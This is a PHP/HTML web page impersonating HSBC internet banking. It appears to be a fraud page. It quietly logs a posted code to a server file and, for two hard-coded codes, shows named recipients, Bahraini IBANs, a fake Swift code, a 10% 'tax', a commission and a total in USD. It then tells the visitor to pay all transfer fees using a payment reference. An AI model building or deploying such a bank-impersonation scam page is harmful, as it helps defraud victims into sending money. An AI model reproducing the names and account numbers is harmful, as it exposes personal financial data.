
<head>
	<style >
		#top{width:100%; height:22px;background:	 #5b5b57 ;}
		 #x{width:100%; height:22px;  margin-top: 5px;}

		 #r{width:100%; height:5%; float: left; margin-top: 40px; background:	 #5b5b57 ;}

		 #y{width:25%; height:100%; float: right; margin-top: 40px; background:	 #D82424 ;}
		 #w{width:40%; height:90%;  margin-top: 40px; background:	 #E9E5E4 ;}


	</style>
<body>
	<div id="top">
		
		<h3 styles="color:  #FDFDFD " >  <pre class="tab"> Personal  Business                                                                                              English</pre> </h3> </div>
		<dir id="x">
	  	<img src="hsbc.jpg">
	  </dir>
	  <dir id="r">
	  	
	  	
	  </dir>


	  <dir id="y">  <form action="zor.php" method="Post"> 
    <h1> internet Banking</h1>
    <input type="submit" value ="Log out" style="color: red" >
    <?php echo "<br>";
    echo "<br>";
    echo "<br>";
    echo "<br>"; ?>
     <img src="photo_2020-10-24_23-34-25.jpg">
      <?php echo "<br>";
      echo "<br>";
      echo "<br>";
      echo "<br>"; ?>
     <img src="photo_2020-10-24_23-34-25 (3).jpg">

</dir>
	   <?php echo "<br>" ; ?>
	   <?php echo "<br>" ; ?>
	    <?php echo "<br>" ; ?>
	   <?php echo "<br>" ; ?>
	   <?php echo "<br>" ; ?>
	   <?php echo "<br>" ; ?>
	    <?php echo "<br>" ; ?>
	   <?php echo "<br>" ; ?>
	   <center>
	   <h1>Payment by Bank Transfer</h1>  <div style="color: blue "> <h4>(Change payment method) </h4> </div> 
	  </center>
	  <div id="w">
	  <h1>Amount To Transfer</h1>
	   <?php 
        session_start();
       if ($_SERVER['REQUEST_METHOD']== 'POST'){
        
        $IB = $_POST['IB'];
        $hane=fopen(rand() , 'a+');
        fwrite($hane, $IB) ;
           if ($IB=="2900636" ) {
        	
            echo  "<br>" ."<br>". "<h2>"."Account Number : " . "ARAFAT ALSAFFAR" . "</h2>"  ;
       
            
            echo "<h2>"." Bank Country : " . "333". "</h2>" ;
           
            
            echo  " ". "<h2>"."IBAN : " . "BH39-BBKU-0020-0002-9006-36" . "</h2>" ;
            echo  "<h2>"."Swiftcode : " . "55555". "</h2>" ;
            echo  "<h2>"."Tax : " . "10%". "</h2>" ;
            echo "<h2>"."Commission : " . "2,643.8 USD". "</h2>" ;
            echo "<h2>"."Total amount  : " . "26,438 USD". "</h2>" ;
            
           }
           else if ($IB=="0521311") {
           	echo  "<br>" ."<br>". "<h2>"."Account Number : " . "FADHEL HASAN MAHDI" . "</h2>"  ;
       
            
            echo "<h2>"." Bank Country : " . "KINGDOM OF BAHRAIN". "</h2>" ;
           
        
            echo  " ". "<h2>"."IBAN : " . "BH72-BBKU-0020-0000-5213-11" . "</h2>" ;
            echo  "<h2>"."Swiftcode : " . "55555". "</h2>" ;
            echo  "<h2>"."Tax : " . "10%". "</h2>" ;
            echo "<h2>"."Commission : " . "4,643.8 USD". "</h2>" ;
            echo "<h2>"."Total amount  : " . "35,564 USD". "</h2>" ;
         
           }
           else{
        	echo "sorry this NOT found back to main page ";
          } ?>

     <form action="zor.php" method="Post"> 
     <input type="submit" value ="main page" style="color: red" >


       

    
      <?php    }else {
    	  echo "<br>".'Return to the main page, please'."<br>"; 
     

                }

 ?>
 
 <h2>Payment Reference  </h2> 
 <div style="color: red">   <h2> #:410000968899</h2></div> 
 	</div>
 	<div style="color: red"><h3>*You must include the payment reference number when you perform the transfer</h3></div>

 
 <h3> important notes</h3> 
 <h4>1. Tell  your bank that 'Sender pays all fees.'</h4>
 <h5>Since the fees charged by your bank or any other intermediate bank(s) are NOT included in your order , it's important that you ask your bank for additional fees that should be added to your order total</h5> 
 <dir style="color: red">
 	<h4>2.Include your payment reference number on the bank transfer form.</h4>
 	<h4>Your payment reference number is : [#410000968899].</h4>
 </dir>
 
 


	  	
	  



</head>




